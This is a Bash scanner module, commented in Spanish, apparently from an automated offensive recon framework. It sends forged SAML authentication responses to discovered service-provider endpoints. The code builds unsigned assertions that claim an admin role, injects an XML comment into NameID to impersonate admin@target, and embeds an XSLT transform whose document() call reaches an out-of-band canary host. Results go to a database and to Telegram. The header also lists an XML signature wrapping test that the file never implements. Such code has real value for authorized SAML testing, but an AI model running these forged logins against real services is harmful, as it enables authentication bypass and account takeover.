#!/usr/bin/env bash
# ============================================================
#  modules/46_saml_scan.sh
#  Tier 2.9 — SAML SP scanner (XSW + signature stripping + comment injection)
#
#  Detecta endpoints SAML SP (Service Provider) y prueba 4 vectores:
#    1. Signature stripping — enviar AuthnResponse sin <ds:Signature>
#    2. XSW (XML Signature Wrapping) — duplicar Assertion fuera del Signed area
#    3. Comment injection en NameID — admin<!---->@target → admin@target
#    4. XSLT transform — <ds:Transform Algorithm="XSLT"> con payload JS
#
#  Endpoints SP típicos:
#    - /saml/SSO, /saml/acs, /saml2/acs
#    - /SAMLAssertionConsumer, /Shibboleth.sso/SAML2/POST
#    - /samlsso, /sso/saml/SSO
#
#  Anti-FP:
#    - El response a un AuthnResponse válido vs forged debe diferir
#      (200 con session creada vs 400/403)
#    - Solo flagear si el SP acepta el forged como válido
# ============================================================

MODULE_NAME="saml_scan"
MODULE_DESC="SAML — XSW, signature stripping, comment injection en NameID"

_saml_finding() {
  local DOMAIN_ID="$1" DOMAIN="$2" TARGET="$3"
  local TYPE="$4" SEV="$5" DETAIL="$6" CONF="${7:-medium}"

  db_add_finding "$DOMAIN_ID" "saml" "$SEV" \
    "$TARGET" "$TYPE" "$DETAIL" "$CONF" 2>/dev/null

  local EMOJI="🔴"
  [[ "$SEV" == "high"   ]] && EMOJI="🟠"
  [[ "$SEV" == "medium" ]] && EMOJI="🟡"

  log_warn "  ⚡ [$SEV/$CONF] SAML $TYPE: $TARGET"

  if [[ "$CONF" != "low" ]] && [[ "$SEV" == "critical" || "$SEV" == "high" ]]; then
    _telegram_send "${EMOJI} *SAML — ${TYPE}*
🌐 \`${DOMAIN}\`
🔗 \`${TARGET}\`
📋 ${DETAIL:0:300}
📊 \`${SEV^^}\` / \`${CONF}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi
}

# ── Build minimal SAML AuthnResponse ───────────────────────
_saml_build_response() {
  local NAMEID="$1" DESTINATION="$2" WITH_SIG="${3:-false}"
  local ID="_$(openssl rand -hex 16)"
  local NOW; NOW=$(date -u '+%Y-%m-%dT%H:%M:%SZ')
  local NOT_AFTER; NOT_AFTER=$(date -u -d '+1 hour' '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || date -u -v+1H '+%Y-%m-%dT%H:%M:%SZ')

  local SIG_BLOCK=""
  if [[ "$WITH_SIG" == "true" ]]; then
    # Fake signature block (no valid, pero estructuralmente correcto)
    SIG_BLOCK='<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#'"$ID"'"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>HACKEADORA_FAKE_DIGEST</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>HACKEADORA_FAKE_SIG</ds:SignatureValue></ds:Signature>'
  fi

  cat <<XML
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="${ID}" Version="2.0" IssueInstant="${NOW}" Destination="${DESTINATION}"><saml:Issuer>https://hackeadora-idp.invalid</saml:Issuer>${SIG_BLOCK}<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion ID="_assertion_$(openssl rand -hex 8)" Version="2.0" IssueInstant="${NOW}"><saml:Issuer>https://hackeadora-idp.invalid</saml:Issuer><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">${NAMEID}</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="${NOT_AFTER}" Recipient="${DESTINATION}"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="${NOW}" NotOnOrAfter="${NOT_AFTER}"><saml:AudienceRestriction><saml:Audience>${DESTINATION%/*}</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement><saml:Attribute Name="email"><saml:AttributeValue>${NAMEID}</saml:AttributeValue></saml:Attribute><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
XML
}

_saml_b64_encode() {
  python3 -c "import base64,sys; print(base64.b64encode(sys.stdin.read().encode()).decode())" 2>/dev/null
}

# ── Test 1: Signature stripping ────────────────────────────
_saml_test_no_sig() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"

  local NAMEID="hackeadora_admin_test@example.com"
  local SAML_RESPONSE B64_RESPONSE
  SAML_RESPONSE=$(_saml_build_response "$NAMEID" "$URL" "false")  # sin signature
  B64_RESPONSE=$(echo -n "$SAML_RESPONSE" | _saml_b64_encode)

  _h_post_noredirect "$URL" "SAMLResponse=${B64_RESPONSE}&RelayState=hackeadora" --connect-timeout 8 \
    -H "Content-Type: application/x-www-form-urlencoded"

  local STATUS="$HTTP_LAST_STATUS"
  local BODY="${HTTP_LAST_BODY:0:2000}"

  # Si responde 200/302 con redirect a área autenticada (no error page) → signature stripping success
  if [[ "$STATUS" =~ ^(200|302)$ ]]; then
    local LOCATION
    LOCATION=$(echo "$HTTP_LAST_HEADERS" | grep -i '^location:' | head -1 | tr -d '\r')
    # Excluir redirects a /login, /error, /sso (typical rejection)
    if echo "$LOCATION" | grep -qiE '/(login|error|forbidden|sso)' || \
       echo "$BODY" | grep -qiE 'invalid signature|signature missing|signature required|saml.*error'; then
      return 1
    fi
    # Si redirect a /home, /dashboard, /app → posible bypass
    if echo "$LOCATION" | grep -qiE '/(home|dashboard|app|portal|index)'; then
      _saml_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
        "saml_signature_stripping" "critical" \
        "SAML SP acepta AuthnResponse SIN <ds:Signature> — auth bypass total. Status: $STATUS, Location: ${LOCATION:0:120}" \
        "high"
      return 0
    fi
  fi
  return 1
}

# ── Test 2: Comment injection en NameID ────────────────────
_saml_test_comment_injection() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"

  # NameID con comentario XML que algunos parsers ignoran:
  # admin@target.com<!---->.invalid puede ser parseado como admin@target.com
  local TARGET_NAMEID="admin@${DOMAIN}<!---->.hackeadora-saml.invalid"
  local SAML_RESPONSE B64_RESPONSE
  SAML_RESPONSE=$(_saml_build_response "$TARGET_NAMEID" "$URL" "true")
  B64_RESPONSE=$(echo -n "$SAML_RESPONSE" | _saml_b64_encode)

  _h_post_noredirect "$URL" "SAMLResponse=${B64_RESPONSE}&RelayState=hackeadora" --connect-timeout 8 \
    -H "Content-Type: application/x-www-form-urlencoded"

  local STATUS="$HTTP_LAST_STATUS"
  local BODY="${HTTP_LAST_BODY:0:2000}"

  # Buscar evidencia de que parser interpretó "admin@target" en lugar del full string
  if [[ "$STATUS" =~ ^(200|302)$ ]]; then
    if echo "$BODY" | grep -qiE "admin@${DOMAIN}|welcome.*admin|<title>.*Dashboard"; then
      _saml_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
        "saml_comment_injection" "critical" \
        "SAML SP parsea NameID con comentario XML — admin@${DOMAIN}<!--> interpretado como admin@${DOMAIN}. Auth bypass / privilege escalation." \
        "high"
      return 0
    fi
  fi
  return 1
}

# ── Test 3: XSLT transform en signature ─────────────────────
_saml_test_xslt_transform() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"

  # AuthnResponse con Transform XSLT — server XML parser puede ejecutar XSLT
  # Si executa, puede leer files o ejecutar code (Java/Saxon, .NET XSLT)
  local CANARY="hackeadora_xslt_$(openssl rand -hex 4)"
  local SAML_RESPONSE
  SAML_RESPONSE=$(cat <<XML
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_$(openssl rand -hex 16)" Version="2.0" IssueInstant="$(date -u '+%Y-%m-%dT%H:%M:%SZ')" Destination="${URL}">
<saml:Issuer>https://hackeadora-idp.invalid</saml:Issuer>
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
<ds:Reference URI=""><ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:template match="/"><xsl:value-of select="document('https://hackeadora-saml-canary.invalid/${CANARY}')"/></xsl:template>
</xsl:stylesheet></ds:Transform></ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
<ds:DigestValue>HACK</ds:DigestValue></ds:Reference></ds:SignedInfo>
<ds:SignatureValue>HACK</ds:SignatureValue></ds:Signature>
<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
</samlp:Response>
XML
)
  local B64_RESPONSE
  B64_RESPONSE=$(echo -n "$SAML_RESPONSE" | _saml_b64_encode)

  _h_post_noredirect "$URL" "SAMLResponse=${B64_RESPONSE}" --connect-timeout 8 \
    -H "Content-Type: application/x-www-form-urlencoded"

  # OOB no se valida en respuesta — solo informativo
  log_info "  SAML XSLT probe enviado a $URL — verifica logs DNS de hackeadora-saml-canary.invalid"
  return 1
}

# ── Main ─────────────────────────────────────────────────────
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 46 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null || true

  # Endpoints SP candidatos
  local SP_ENDPOINTS
  SP_ENDPOINTS=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND (
         url LIKE '%/saml/SSO%' OR url LIKE '%/saml/acs%' OR url LIKE '%/saml2/acs%'
         OR url LIKE '%/SAMLAssertionConsumer%' OR url LIKE '%/Shibboleth.sso/SAML2/POST%'
         OR url LIKE '%/samlsso%' OR url LIKE '%/sso/saml%'
         OR url LIKE '%/saml/login%' OR url LIKE '%/saml-sp%'
       )
     LIMIT 10;" 2>/dev/null | sort -u)

  if [[ -z "$SP_ENDPOINTS" ]]; then
    log_info "  Sin endpoints SAML SP candidatos — saltando"
    return 0
  fi

  local COUNT
  COUNT=$(echo "$SP_ENDPOINTS" | grep -c .)
  log_info "  ${COUNT} endpoints SAML SP candidatos"

  local TOTAL_FINDINGS=0
  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    log_info "  → $URL"

    _saml_test_no_sig            "$URL" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL_FINDINGS++))
    _saml_test_comment_injection "$URL" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL_FINDINGS++))
    _saml_test_xslt_transform    "$URL" "$DOMAIN_ID" "$DOMAIN"  # OOB only
  done <<< "$SP_ENDPOINTS"

  log_ok "$MODULE_DESC: ${TOTAL_FINDINGS} findings sobre ${COUNT} SP endpoints"
}
